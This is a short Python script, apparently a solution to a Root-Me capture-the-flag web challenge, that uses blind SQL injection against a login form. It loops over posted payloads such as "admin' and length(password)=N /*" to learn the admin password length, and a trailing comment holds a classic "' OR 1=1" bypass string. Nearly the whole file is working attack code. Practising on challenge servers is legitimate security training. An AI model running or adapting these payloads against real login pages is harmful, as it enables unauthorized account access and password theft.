#!/usr/bin/env python3

import requests

url="http://challenge01.root-me.org/web-serveur/ch9/"

max = 100; 
longueur = 0;
print("Bruteforce de la longueur du mot de passe en cours...<br />")

for i in range(max):

    playload = {
        'login': f"admin' and length(password)={i} /*",
        'password': 'testtest'
    }

    res = requests.post(url, playload)

    if "Error : no such user/password" not in res.text:
        print("Lenght is %d", i)
        break

"""

dd' OR 1=1
"""